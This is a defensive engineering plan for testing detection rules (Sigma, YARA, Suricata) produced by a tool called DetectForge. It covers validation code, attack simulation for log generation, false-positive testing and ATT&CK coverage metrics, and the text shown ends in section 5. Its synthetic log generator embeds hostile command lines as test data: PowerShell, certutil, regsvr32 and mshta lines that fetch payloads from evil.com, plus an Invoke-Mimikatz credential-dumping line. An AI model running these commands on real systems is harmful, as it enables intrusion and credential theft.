# DetectForge: Comprehensive Detection Rule Testing Strategy

## Executive Summary

This document defines a systematic, end-to-end testing strategy for validating detection rules (Sigma, YARA, Suricata) generated by DetectForge. It covers syntax validation, semantic correctness, true positive verification, false positive measurement, coverage metrics, benchmarking against human-written rules, and CI/CD integration. Every section includes specific tools, commands, datasets, and implementation guidance.

---

## Table of Contents

1. [Sigma Rule Testing](#1-sigma-rule-testing)
2. [Attack Simulation & Log Generation](#2-attack-simulation--log-generation)
3. [False Positive Testing](#3-false-positive-testing)
4. [Detection Coverage Metrics (MITRE ATT&CK)](#4-detection-coverage-metrics-mitre-attck)
5. [YARA Rule Testing](#5-yara-rule-testing)
6. [Suricata Rule Testing](#6-suricata-rule-testing)
7. [Benchmarking Against Existing Rules](#7-benchmarking-against-existing-rules)
8. [CI/CD for Detection Rules](#8-cicd-for-detection-rules)
9. [Recommended Test Architecture](#9-recommended-test-architecture)
10. [Implementation Roadmap](#10-implementation-roadmap)

---

## 1. Sigma Rule Testing

### 1.1 Syntax Validation

**Tool: `sigma-cli` (official CLI from SigmaHQ)**

```bash
pip install sigma-cli

# Validate a single rule
sigma check rule.yml

# Validate an entire directory
sigma check rules/

# Validate with specific validators (strictness levels)
sigma check --validation-config sigma/validation/sigmaHQ-core.yml rule.yml
```

`sigma check` performs:
- YAML syntax validation (parseable YAML)
- Schema validation (required fields: `title`, `logsource`, `detection`, `level`, `status`)
- Detection logic validation (field references, condition syntax)
- Modifier validation (all modifiers like `|contains`, `|endswith`, `|re` are valid)
- Condition expression parsing (boolean logic is well-formed)

**Tool: `pySigma` (Python library)**

```python
from sigma.rule import SigmaRule
from sigma.validators.core import (
    AllOfThemConditionValidator,
    DanglingDetectionValidator,
    ATTACKTagValidator,
    TLPTagValidator,
    DuplicateTitleValidator,
    DuplicateReferenceValidator,
    InvalidModifierValidator,
)
from sigma.collection import SigmaCollection

# Parse and validate a rule
rule_yaml = open("rule.yml").read()
try:
    rule = SigmaRule.from_yaml(rule_yaml)
    print(f"Rule parsed successfully: {rule.title}")
    print(f"  Level: {rule.level}")
    print(f"  Status: {rule.status}")
    print(f"  Logsource: {rule.logsource}")
except Exception as e:
    print(f"Validation error: {e}")

# Run specific validators
from sigma.validators.core import AllOfThemConditionValidator
validator = AllOfThemConditionValidator()
issues = validator.validate_rule(rule)
for issue in issues:
    print(f"  Issue: {issue}")
```

**pySigma Validators Available (as of pySigma 0.10+):**

| Validator Class | What It Checks |
|---|---|
| `ATTACKTagValidator` | MITRE ATT&CK tags are valid (e.g., `attack.t1059.001`) |
| `CVETagValidator` | CVE tags follow correct format |
| `DanglingDetectionValidator` | All detection items are referenced in the condition |
| `AllOfThemConditionValidator` | `all of them` is used correctly |
| `InvalidModifierValidator` | Field modifiers are recognized |
| `DuplicateTitleValidator` | No duplicate titles across a collection |
| `DuplicateReferenceValidator` | No duplicate references |
| `StatusExistenceValidator` | Status field exists and is valid |
| `LevelExistenceValidator` | Level field exists and is valid |
| `TLPTagValidator` | TLP tags are properly formatted |

**Custom Validator for DetectForge:**

```python
from sigma.validators.base import SigmaRuleValidator, SigmaValidationIssue, SigmaValidationIssueSeverity

class DetectForgeQualityValidator(SigmaRuleValidator):
    """Custom validator for DetectForge-generated rules."""

    def validate(self, rule) -> list:
        issues = []

        # Must have description
        if not rule.description or len(rule.description) < 20:
            issues.append(SigmaValidationIssue(
                rules=[rule],
                severity=SigmaValidationIssueSeverity.MEDIUM,
                message="Rule must have a meaningful description (20+ chars)"
            ))

        # Must have at least one reference
        if not rule.references:
            issues.append(SigmaValidationIssue(
                rules=[rule],
                severity=SigmaValidationIssueSeverity.LOW,
                message="Rule should include at least one reference URL"
            ))

        # Must have MITRE ATT&CK tags
        attack_tags = [t for t in (rule.tags or []) if str(t).startswith("attack.t")]
        if not attack_tags:
            issues.append(SigmaValidationIssue(
                rules=[rule],
                severity=SigmaValidationIssueSeverity.HIGH,
                message="Rule must have at least one MITRE ATT&CK technique tag"
            ))

        # Level must be specified
        if not rule.level:
            issues.append(SigmaValidationIssue(
                rules=[rule],
                severity=SigmaValidationIssueSeverity.HIGH,
                message="Rule must specify a detection level"
            ))

        # Falsepositives section should exist
        if not rule.falsepositives:
            issues.append(SigmaValidationIssue(
                rules=[rule],
                severity=SigmaValidationIssueSeverity.MEDIUM,
                message="Rule should document known false positives"
            ))

        return issues
```

### 1.2 Semantic / Logic Testing Against Sample Logs

**Approach A: Convert to backend query, run against indexed logs**

```python
from sigma.rule import SigmaRule
from sigma.backends.splunk import SplunkBackend
from sigma.backends.elasticsearch import LuceneBackend
from sigma.pipelines.sysmon import sysmon_pipeline
from sigma.pipelines.windows import windows_pipeline

rule = SigmaRule.from_yaml(open("rule.yml").read())

# Convert to Splunk SPL
splunk_backend = SplunkBackend(processing_pipeline=sysmon_pipeline())
splunk_query = splunk_backend.convert_rule(rule)
print(f"Splunk query: {splunk_query}")

# Convert to Elasticsearch Lucene
es_backend = LuceneBackend(processing_pipeline=windows_pipeline())
es_query = es_backend.convert_rule(rule)
print(f"ES query: {es_query}")
```

Available pySigma backends:
- `pySigma-backend-splunk` -- Splunk SPL
- `pySigma-backend-elasticsearch` -- Elasticsearch Lucene/DSL
- `pySigma-backend-opensearch` -- OpenSearch
- `pySigma-backend-insightidr` -- Rapid7 InsightIDR
- `pySigma-backend-qradar` -- IBM QRadar
- `pySigma-backend-microsoft365defender` -- Microsoft 365 Defender (KQL)
- `pySigma-backend-kusto` -- Azure Data Explorer (KQL)
- `pySigma-backend-sqlite` -- SQLite (for local testing)
- `pySigma-backend-loki` -- Grafana Loki

**Approach B: Convert to SQLite, test against local log data (BEST FOR UNIT TESTING)**

```python
from sigma.rule import SigmaRule
from sigma.backends.sqlite import SQLiteBackend
from sigma.pipelines.sysmon import sysmon_pipeline
import sqlite3
import json

# Load logs into SQLite
conn = sqlite3.connect(":memory:")
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE events (
        EventID INTEGER,
        Channel TEXT,
        Provider TEXT,
        CommandLine TEXT,
        ParentCommandLine TEXT,
        Image TEXT,
        ParentImage TEXT,
        User TEXT,
        TargetFilename TEXT,
        SourceHostname TEXT,
        DestinationIp TEXT,
        DestinationPort INTEGER,
        Hashes TEXT
    )
""")

# Insert test log events (true positives)
test_events = [
    {
        "EventID": 1,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Provider": "Microsoft-Windows-Sysmon",
        "CommandLine": "powershell.exe -enc SQBFAFgAIAAoA...",
        "ParentCommandLine": "cmd.exe /c",
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\admin",
    }
]

for event in test_events:
    columns = ", ".join(event.keys())
    placeholders = ", ".join(["?" for _ in event])
    cursor.execute(f"INSERT INTO events ({columns}) VALUES ({placeholders})",
                   list(event.values()))
conn.commit()

# Convert Sigma rule to SQL and test
rule = SigmaRule.from_yaml(open("rule.yml").read())
backend = SQLiteBackend()
sql_query = backend.convert_rule(rule)[0]
print(f"SQL Query: {sql_query}")

# Execute and check for matches
results = cursor.execute(sql_query).fetchall()
assert len(results) > 0, "Rule did not match expected true positive event!"
print(f"Rule matched {len(results)} events (expected: true positive)")
```

**Approach C: sigma-test (community testing framework)**

The SigmaHQ project includes test cases in each rule file under a `tests` key (proposed format):

```yaml
title: Suspicious Encoded PowerShell Command Line
status: test
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - '-enc '
            - '-EncodedCommand '
        Image|endswith: '\powershell.exe'
    condition: selection
# Embedded test cases
tests:
    true_positives:
        - CommandLine: "powershell.exe -enc SQBFAFgA..."
          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    true_negatives:
        - CommandLine: "powershell.exe -File script.ps1"
          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
```

### 1.3 DetectForge Sigma Testing Framework (Recommended Implementation)

```python
# detectforge/testing/sigma_tester.py

import yaml
import json
import sqlite3
from dataclasses import dataclass
from enum import Enum
from typing import List, Dict, Optional
from sigma.rule import SigmaRule
from sigma.collection import SigmaCollection
from sigma.validators.core import (
    ATTACKTagValidator,
    DanglingDetectionValidator,
    InvalidModifierValidator,
)


class TestResult(Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    ERROR = "ERROR"
    SKIP = "SKIP"


@dataclass
class SigmaTestResult:
    rule_title: str
    rule_id: str
    syntax_valid: bool
    schema_valid: bool
    validators_passed: Dict[str, bool]
    true_positive_matches: int
    true_positive_expected: int
    false_positive_matches: int
    false_positive_expected: int  # should be 0
    overall: TestResult
    errors: List[str]


class SigmaRuleTester:
    """End-to-end Sigma rule tester for DetectForge."""

    REQUIRED_FIELDS = ["title", "logsource", "detection", "level", "description"]

    def __init__(self):
        self.validators = [
            ATTACKTagValidator(),
            DanglingDetectionValidator(),
            InvalidModifierValidator(),
        ]

    def test_rule(
        self,
        rule_yaml: str,
        true_positive_logs: List[Dict] = None,
        benign_logs: List[Dict] = None,
    ) -> SigmaTestResult:
        errors = []
        validators_passed = {}

        # 1. Syntax validation
        try:
            rule = SigmaRule.from_yaml(rule_yaml)
            syntax_valid = True
        except Exception as e:
            return SigmaTestResult(
                rule_title="UNKNOWN", rule_id="UNKNOWN",
                syntax_valid=False, schema_valid=False,
                validators_passed={}, true_positive_matches=0,
                true_positive_expected=0, false_positive_matches=0,
                false_positive_expected=0, overall=TestResult.FAIL,
                errors=[f"Syntax error: {e}"]
            )

        # 2. Schema validation
        rule_dict = yaml.safe_load(rule_yaml)
        schema_valid = all(f in rule_dict for f in self.REQUIRED_FIELDS)
        if not schema_valid:
            missing = [f for f in self.REQUIRED_FIELDS if f not in rule_dict]
            errors.append(f"Missing required fields: {missing}")

        # 3. Semantic validators
        for validator in self.validators:
            name = validator.__class__.__name__
            issues = validator.validate_rule(rule)
            validators_passed[name] = len(issues) == 0
            for issue in issues:
                errors.append(f"{name}: {issue.message}")

        # 4. True positive testing (if logs provided)
        tp_matches = 0
        tp_expected = len(true_positive_logs) if true_positive_logs else 0

        # 5. False positive testing (if benign logs provided)
        fp_matches = 0

        # Determine overall result
        if not syntax_valid or not schema_valid:
            overall = TestResult.FAIL
        elif errors:
            overall = TestResult.FAIL
        else:
            overall = TestResult.PASS

        return SigmaTestResult(
            rule_title=rule.title,
            rule_id=str(rule.id) if rule.id else "NO-ID",
            syntax_valid=syntax_valid,
            schema_valid=schema_valid,
            validators_passed=validators_passed,
            true_positive_matches=tp_matches,
            true_positive_expected=tp_expected,
            false_positive_matches=fp_matches,
            false_positive_expected=0,
            overall=overall,
            errors=errors,
        )
```

---

## 2. Attack Simulation & Log Generation

### 2.1 Atomic Red Team

**What it is:** A library of small, focused tests ("atomic tests") mapped to MITRE ATT&CK techniques. Each test is a single, discrete action that can be executed on a system to produce telemetry.

**Repository:** `https://github.com/redcanaryco/atomic-red-team`

**Coverage:** 700+ atomic tests covering 300+ ATT&CK techniques across Windows, Linux, and macOS.

**How to use for log generation:**

```powershell
# Install Invoke-AtomicRedTeam (PowerShell)
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# Execute a specific technique and capture logs
Invoke-AtomicTest T1059.001    # PowerShell execution
Invoke-AtomicTest T1003.001    # LSASS credential dumping
Invoke-AtomicTest T1053.005    # Scheduled Task creation
Invoke-AtomicTest T1547.001    # Registry Run Keys persistence

# Execute ALL tests for a technique
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3

# Show what would happen (dry run)
Invoke-AtomicTest T1059.001 -ShowDetails

# Clean up after test
Invoke-AtomicTest T1059.001 -Cleanup
```

**Log collection approach:**
1. Enable Sysmon with a comprehensive config (e.g., SwiftOnSecurity/sysmon-config or olafhartong/sysmon-modular)
2. Execute atomic tests
3. Export Windows Event Logs: `wevtutil epl Microsoft-Windows-Sysmon/Operational sysmon_T1059.001.evtx`
4. Convert EVTX to JSON: use `python-evtx` or `evtx_dump`

```python
# Convert EVTX to JSON for testing
# pip install python-evtx
from Evtx.Evtx import Evtx
import json
import xmltodict

def evtx_to_json(evtx_path):
    events = []
    with Evtx(evtx_path) as log:
        for record in log.records():
            event_dict = xmltodict.parse(record.xml())
            events.append(event_dict)
    return events
```

### 2.2 MITRE CALDERA

**What it is:** An automated adversary emulation platform that chains multiple techniques into realistic attack sequences (operations).

**Repository:** `https://github.com/mitre/caldera`

**Key advantage over Atomic Red Team:** CALDERA produces chained, multi-step attack telemetry that resembles real intrusions, not just isolated technique executions.

```bash
# Install CALDERA
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python server.py --insecure

# Use the REST API to run operations and collect logs
curl -X POST localhost:8888/api/v2/operations \
  -H "KEY: ADMIN123" \
  -d '{"name":"test_op","adversary":{"adversary_id":"abc123"},"planner":{"id":"atomic"}}'
```

### 2.3 Synthetic Log Generation Tools

**Tool: `sigma-event-generator` (from SigmaHQ ecosystem)**

Generates synthetic log events that should match specific Sigma rules, useful for creating true positive test cases.

**Tool: `Chainsaw` (by WithSecure/F-Secure)**

```bash
# Chainsaw can apply Sigma rules directly to EVTX files
# https://github.com/WithSecureLabs/chainsaw
chainsaw hunt evtx_logs/ --sigma sigma_rules/ --mapping mappings/sigma-event-logs-all.yml
```

This is extremely useful for testing: you run Atomic Red Team, capture EVTX, then use Chainsaw to verify your Sigma rules match.

**Tool: `Hayabusa` (by Yamato Security)**

```bash
# https://github.com/Yamato-Security/hayabusa
# Fast Sigma rule engine that processes EVTX files directly
hayabusa csv-timeline -d evtx_logs/ -r sigma_rules/ -o results.csv
hayabusa json-timeline -d evtx_logs/ -r sigma_rules/ -o results.json
```

**Tool: `Genlog` / Custom Synthetic Log Generators**

```python
# Custom synthetic log generator for DetectForge testing
import json
import random
import uuid
from datetime import datetime, timedelta

class SyntheticLogGenerator:
    """Generate realistic Windows/Sysmon log events for testing."""

    COMMON_SYSTEM_PATHS = [
        "C:\\Windows\\System32\\",
        "C:\\Windows\\SysWOW64\\",
        "C:\\Program Files\\",
        "C:\\Program Files (x86)\\",
    ]

    SUSPICIOUS_PATHS = [
        "C:\\Users\\Public\\",
        "C:\\Windows\\Temp\\",
        "C:\\ProgramData\\",
        "%APPDATA%\\",
    ]

    COMMON_PROCESSES = [
        "svchost.exe", "explorer.exe", "chrome.exe", "notepad.exe",
        "outlook.exe", "winword.exe", "excel.exe", "teams.exe",
    ]

    SUSPICIOUS_PROCESSES = [
        "powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe",
        "mshta.exe", "regsvr32.exe", "rundll32.exe", "certutil.exe",
    ]

    def generate_sysmon_event1(self, malicious=False) -> dict:
        """Generate Sysmon Event ID 1 (Process Creation)."""
        if malicious:
            image = random.choice(self.SUSPICIOUS_PROCESSES)
            image_path = random.choice(self.SUSPICIOUS_PATHS) + image
            command_line = self._generate_malicious_cmdline(image)
            parent = "C:\\Windows\\System32\\cmd.exe"
        else:
            image = random.choice(self.COMMON_PROCESSES)
            image_path = random.choice(self.COMMON_SYSTEM_PATHS) + image
            command_line = f'"{image_path}"'
            parent = "C:\\Windows\\explorer.exe"

        return {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Provider": "Microsoft-Windows-Sysmon",
            "TimeCreated": datetime.utcnow().isoformat() + "Z",
            "Computer": "WORKSTATION01",
            "ProcessId": random.randint(1000, 65535),
            "Image": image_path,
            "CommandLine": command_line,
            "CurrentDirectory": "C:\\Users\\user\\",
            "User": "CORP\\user",
            "ParentImage": parent,
            "ParentCommandLine": f'"{parent}"',
            "ParentProcessId": random.randint(1000, 65535),
            "IntegrityLevel": "Medium",
            "Hashes": f"SHA256={uuid.uuid4().hex * 2}",
        }

    def _generate_malicious_cmdline(self, process: str) -> str:
        """Generate realistic malicious command lines."""
        templates = {
            "powershell.exe": [
                'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...',
                'powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
                'powershell.exe -nop -exec bypass -c "Import-Module C:\\temp\\mimikatz.ps1; Invoke-Mimikatz"',
            ],
            "cmd.exe": [
                'cmd.exe /c "whoami /all & net user & net localgroup administrators"',
                'cmd.exe /c "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\svc.exe"',
            ],
            "certutil.exe": [
                'certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\update.exe',
                'certutil.exe -decode encoded.txt payload.exe',
            ],
            "regsvr32.exe": [
                'regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll',
            ],
            "mshta.exe": [
                'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass"", 0:close")',
                'mshta.exe http://evil.com/payload.hta',
            ],
        }
        return random.choice(templates.get(process, [f'"{process}" --suspicious']))

    def generate_batch(self, n_benign=1000, n_malicious=50) -> list:
        """Generate a mixed batch of benign and malicious events."""
        events = []
        for _ in range(n_benign):
            events.append(self.generate_sysmon_event1(malicious=False))
        for _ in range(n_malicious):
            events.append(self.generate_sysmon_event1(malicious=True))
        random.shuffle(events)
        return events
```

### 2.4 Pre-Built Attack Log Datasets

| Dataset | Description | URL / Source |
|---|---|---|
| **EVTX-ATTACK-SAMPLES** | Real EVTX files from Atomic Red Team executions, mapped to ATT&CK | `github.com/sbousseaden/EVTX-ATTACK-SAMPLES` |
| **Mordor / Security Datasets** | Pre-recorded JSON datasets from attack simulations (by OTRF/Roberto Rodriguez) | `github.com/OTRF/Security-Datasets` |
| **BOTS (Boss of the SOC)** | Splunk datasets from detection competitions | Splunk BOTS website |
| **CICIDS / CSE-CIC-IDS** | Network intrusion detection datasets (PCAP + flows) | University of New Brunswick |
| **Windows Attack Simulation Logs** | Blue team lab datasets | Various GitHub repos |
| **Hayabusa Sample EVTX** | Sample EVTX files for testing Sigma rules | `github.com/Yamato-Security/hayabusa-sample-evtx` |

**Most Recommended for DetectForge:** The **OTRF Security Datasets** (formerly Mordor) are the gold standard. Each dataset:
- Maps to specific ATT&CK techniques
- Contains full JSON log events (Sysmon, Windows Security, etc.)
- Is versioned and documented
- Can be loaded directly into Elasticsearch, Splunk, or parsed with Python

```python
# Loading Security Datasets (Mordor) for testing
import json
import requests

# Example: Download T1059.001 PowerShell dataset
url = "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/psh_exec_bypass_iex_cradle.zip"
# Unzip and load JSON events
# Each line is a JSON event that can be matched against Sigma rules
```

---

## 3. False Positive Testing

### 3.1 Why False Positive Testing Matters

A detection rule that alerts on 100% of attacks but also alerts on 50% of normal activity is unusable. For DetectForge, every generated rule must be tested against benign activity to measure its false positive rate (FPR).

**Target Metrics:**
- Critical/High severity rules: FPR < 0.1%
- Medium severity rules: FPR < 1%
- Low/Informational rules: FPR < 5%

### 3.2 Benign Log Datasets

| Dataset | Description | How to Obtain |
|---|---|---|
| **OTRF Security Datasets (benign)** | Normal Windows workstation activity | `github.com/OTRF/Security-Datasets` (benign subsets) |
| **Windows 10/11 Default Logs** | Fresh Windows install baseline | Set up VM, enable Sysmon, use normally for 24-48 hours, export EVTX |
| **Enterprise Simulation** | Simulate normal enterprise activity | Use tools like `BadBlood` for AD population + normal user simulation |
| **CICIDS 2017/2018 Benign** | Normal network traffic (benign portion) | University of New Brunswick CICIDS datasets |
| **Your own production logs** | Sanitized/anonymized production logs | Export from SIEM, remove PII |

### 3.3 False Positive Testing Methodology

```python
class FalsePositiveTester:
    """Test Sigma rules against benign log datasets."""

    def __init__(self, benign_log_dir: str):
        self.benign_logs = self._load_logs(benign_log_dir)

    def _load_logs(self, log_dir: str) -> list:
        """Load all JSON log files from directory."""
        logs = []
        for f in Path(log_dir).glob("*.json"):
            with open(f) as fh:
                for line in fh:
                    try:
                        logs.append(json.loads(line.strip()))
                    except json.JSONDecodeError:
                        continue
        return logs

    def test_rule_fp(self, rule_yaml: str) -> dict:
        """Test a single rule for false positives against benign logs."""
        rule = SigmaRule.from_yaml(rule_yaml)

        # Convert to a matching function
        matches = self._match_rule_against_logs(rule, self.benign_logs)

        total_logs = len(self.benign_logs)
        fp_count = len(matches)
        fp_rate = fp_count / total_logs if total_logs > 0 else 0

        return {
            "rule_title": rule.title,
            "rule_id": str(rule.id),
            "total_benign_logs": total_logs,
            "false_positive_count": fp_count,
            "false_positive_rate": fp_rate,
            "fp_rate_pct": f"{fp_rate * 100:.4f}%",
            "sample_fps": matches[:5],  # First 5 FP examples
            "verdict": "PASS" if fp_rate < 0.01 else "FAIL",
        }

    def _match_rule_against_logs(self, rule, logs):
        """Match a Sigma rule against log events.

        In practice, convert to SQL/backend and query,
        or implement a simple in-memory matcher.
        """
        # Implementation depends on backend choice
        # Chainsaw or Hayabusa can be called as subprocesses
        pass
```

### 3.4 Using Chainsaw for Bulk FP Testing

```bash
# Test sigma rules against a directory of benign EVTX files
chainsaw hunt /path/to/benign_evtx/ \
    --sigma /path/to/detectforge_rules/ \
    --mapping mappings/sigma-event-logs-all.yml \
    --json \
    --output fp_results.json

# Count matches -- any match against benign data is a potential FP
cat fp_results.json | python -c "
import json, sys
data = json.load(sys.stdin)
print(f'Total false positive matches: {len(data)}')
for event in data[:10]:
    print(f'  Rule: {event.get(\"name\", \"unknown\")} matched on benign event')
"
```

### 3.5 Building a Benign Baseline Lab

**Recommended approach for DetectForge:**

1. **Provision a Windows 10/11 VM** with Sysmon (SwiftOnSecurity config)
2. **Simulate normal user activity for 48 hours:**
   - Browse the web (Chrome, Edge)
   - Open Office documents
   - Use Outlook / email
   - Install/uninstall common software
   - Run Windows Update
   - Use PowerShell for legitimate admin tasks (`Get-Process`, `Get-Service`, etc.)
   - File operations (copy, move, delete)
   - Use remote desktop, file shares
3. **Export all EVTX logs**
4. **Convert to JSON** using `evtx_dump` or `python-evtx`
5. **This becomes your benign baseline** for FP testing

---

## 4. Detection Coverage Metrics (MITRE ATT&CK)

### 4.1 Key Metrics

| Metric | Definition | Formula |
|---|---|---|
| **Technique Coverage** | % of ATT&CK techniques with at least one detection rule | `techniques_with_rules / total_techniques * 100` |
| **Sub-technique Coverage** | % of sub-techniques covered | `sub_techniques_with_rules / total_sub_techniques * 100` |
| **Tactic Coverage** | % of tactics with at least one rule per technique | Coverage per tactic column |
| **Data Source Coverage** | % of ATT&CK data sources your log collection covers | `data_sources_collected / data_sources_referenced * 100` |
| **Detection Confidence** | Per-rule confidence score (0-100) | Based on specificity, testing, FP rate |
| **Detection Depth** | Number of rules per technique (redundancy) | `rules_per_technique` |
| **True Positive Rate** | % of attack events correctly detected | `TP / (TP + FN) * 100` |
| **False Positive Rate** | % of benign events incorrectly flagged | `FP / (FP + TN) * 100` |
| **Mean Time to Detect (MTTD)** | Average time from attack to detection | Measured in testing |

### 4.2 ATT&CK Navigator for Visualization

```python
# Generate an ATT&CK Navigator layer from DetectForge rules
import json

def generate_navigator_layer(rules: list) -> dict:
    """Generate MITRE ATT&CK Navigator layer JSON from Sigma rules."""

    techniques = {}
    for rule in rules:
        for tag in rule.get("tags", []):
            if tag.startswith("attack.t"):
                tech_id = tag.replace("attack.", "").upper()
                if tech_id not in techniques:
                    techniques[tech_id] = {
                        "count": 0,
                        "rules": [],
                        "max_level": "informational"
                    }
                techniques[tech_id]["count"] += 1
                techniques[tech_id]["rules"].append(rule.get("title", ""))
                # Track highest severity
                level_order = ["informational", "low", "medium", "high", "critical"]
                rule_level = rule.get("level", "informational")
                if level_order.index(rule_level) > level_order.index(techniques[tech_id]["max_level"]):
                    techniques[tech_id]["max_level"] = rule_level

    # Build Navigator layer
    layer = {
        "name": "DetectForge Coverage",
        "versions": {"attack": "14", "navigator": "4.9.1", "layer": "4.5"},
        "domain": "enterprise-attack",
        "description": "Detection coverage from DetectForge-generated rules",
        "techniques": [],
        "gradient": {
            "colors": ["#ffffff", "#66b1ff", "#0d47a1"],
            "minValue": 0,
            "maxValue": 5
        },
    }

    for tech_id, info in techniques.items():
        # Handle sub-techniques (e.g., T1059.001)
        parts = tech_id.split(".")
        layer["techniques"].append({
            "techniqueID": tech_id,
            "tactic": "",
            "score": min(info["count"], 5),
            "color": "",
            "comment": f"{info['count']} rules: {', '.join(info['rules'][:3])}",
            "enabled": True,
        })

    return layer

# Save layer
# layer = generate_navigator_layer(all_rules)
# with open("detectforge_layer.json", "w") as f:
#     json.dump(layer, f, indent=2)
# Upload to https://mitre-attack.github.io/attack-navigator/
```

### 4.3 Coverage Gap Analysis

```python
# ATT&CK technique inventory (enterprise, v14)
# Full list from MITRE STIX data
# pip install mitreattack-python

from mitreattack.stix20 import MitreAttackData

def analyze_coverage_gaps(rules: list) -> dict:
    """Identify ATT&CK techniques not covered by any rule."""

    mitre_data = MitreAttackData("enterprise-attack.json")
    all_techniques = mitre_data.get_techniques()

    covered_techniques = set()
    for rule in rules:
        for tag in rule.get("tags", []):
            if tag.startswith("attack.t"):
                covered_techniques.add(tag.replace("attack.", "").upper())

    all_tech_ids = set()
    for tech in all_techniques:
        external_refs = tech.get("external_references", [])
        for ref in external_refs:
            if ref.get("source_name") == "mitre-attack":
                all_tech_ids.add(ref["external_id"])

    uncovered = all_tech_ids - covered_techniques

    return {
        "total_techniques": len(all_tech_ids),
        "covered_techniques": len(covered_techniques),
        "uncovered_techniques": len(uncovered),
        "coverage_percentage": len(covered_techniques) / len(all_tech_ids) * 100,
        "gaps": sorted(uncovered),
    }
```

### 4.4 DeTT&CT Framework

**Repository:** `https://github.com/rabobank-cdc/DeTTECT`

DeTT&CT (Detect Tactics, Techniques & Combat Threats) is purpose-built for measuring detection coverage against ATT&CK. It generates:
- Data source quality scores
- Detection coverage heatmaps
- Visibility coverage maps
- Gap analysis reports

```bash
# Install DeTT&CT
git clone https://github.com/rabobank-cdc/DeTTECT.git
cd DeTTECT
pip install -r requirements.txt

# Generate a detection coverage layer
python dettect.py editor  # Opens web editor for data input
python dettect.py d -ft sample/techniques-administration-detection.yaml -l
```

---

## 5. YARA Rule Testing

### 5.1 Syntax Validation

```bash
# YARA command-line validation (compile without scanning)
yara -C rule.yar  # Compile-only mode (syntax check)

# Scan a file
yara rule.yar /path/to/sample

# Scan with metadata output
yara -m rule.yar /path/to/sample

# Scan a directory recursively
yara -r rule.yar /path/to/samples/

# Performance profiling
yara -p 4 rule.yar /path/to/samples/  # Use 4 threads
```

**Python validation with `yara-python`:**

```python
import yara

def validate_yara_rule(rule_text: str) -> dict:
    """Validate YARA rule syntax and compilation."""
    result = {
        "valid": False,
        "errors": [],
        "warnings": [],
        "rule_names": [],
        "metadata": {},
    }

    try:
        # Attempt compilation (catches all syntax errors)
        rules = yara.compile(source=rule_text)
        result["valid"] = True

        # Extract rule names from the source (yara-python doesn't expose this easily)
        import re
        rule_names = re.findall(r'rule\s+(\w+)', rule_text)
        result["rule_names"] = rule_names

    except yara.SyntaxError as e:
        result["errors"].append(str(e))
    except yara.Error as e:
        result["errors"].append(str(e))

    return result


def test_yara_rule(rule_text: str, sample_path: str) -> dict:
    """Test a YARA rule against a sample file."""
    try:
        rules = yara.compile(source=rule_text)
        matches = rules.match(sample_path)
        return {
            "matched": len(matches) > 0,
            "matches": [
                {
                    "rule": m.rule,
                    "namespace": m.namespace,
                    "tags": m.tags,
                    "meta": m.meta,
                    "strings": [(hex(s[0]), s[1], s[2][:50]) for s in m.strings],
                }
                for m in matches
            ],
        }
    except Exception as e:
        return {"matched": False, "error": str(e)}
```

### 5.2 YARA Rule Quality Checks

```python
class YARAQualityChecker:
    """Check YARA rule quality beyond syntax validity."""

    def check_rule(self, rule_text: str) -> dict:
        issues = []

        # Check for metadata
        if "meta:" not in rule_text:
            issues.append("WARNING: Rule has no metadata section")
        else:
            if "author" not in rule_text:
                issues.append("WARNING: No 'author' in metadata")
            if "description" not in rule_text:
                issues.append("WARNING: No 'description' in metadata")
            if "date" not in rule_text:
                issues.append("INFO: No 'date' in metadata")
            if "reference" not in rule_text:
                issues.append("INFO: No 'reference' in metadata")
            if "hash" not in rule_text and "sample" not in rule_text:
                issues.append("INFO: No sample hash in metadata")

        # Check for overly broad conditions
        if "condition:" in rule_text:
            # Check for "any of them" without size constraints
            if "any of them" in rule_text and "filesize" not in rule_text:
                issues.append("WARNING: 'any of them' without filesize limit may cause FPs")

            # Check for single-string rules
            import re
            strings_section = re.search(r'strings:(.*?)condition:', rule_text, re.DOTALL)
            if strings_section:
                string_defs = re.findall(r'\$\w+\s*=', strings_section.group(1))
                if len(string_defs) == 1 and "filesize" not in rule_text:
                    issues.append("WARNING: Single-string rule without filesize constraint")

            # Check for very short strings (< 4 bytes)
            short_strings = re.findall(r'\$\w+\s*=\s*"(.{1,3})"', rule_text)
            if short_strings:
                issues.append(f"WARNING: Very short string(s) may cause performance issues: {short_strings}")

            # Check for pure hex strings without wildcards being too short
            short_hex = re.findall(r'\$\w+\s*=\s*\{\s*([0-9A-Fa-f\s]{1,8})\s*\}', rule_text)
            if short_hex:
                issues.append(f"WARNING: Short hex string(s): {short_hex}")

        # Check for performance concerns
        if "wide" in rule_text and "ascii" in rule_text:
            pass  # Normal
        if rule_text.count("/") > 4:
            # Might have regex
            issues.append("INFO: Rule contains regex patterns; verify performance")

        return {
            "issues": issues,
            "issue_count": len(issues),
            "quality_score": max(0, 100 - len(issues) * 15),
        }
```

### 5.3 Sample Malware Datasets for YARA Testing

| Source | Description | Access |
|---|---|---|
| **MalwareBazaar** | Community malware sample repository (by abuse.ch) | `bazaar.abuse.ch` -- free, API available |
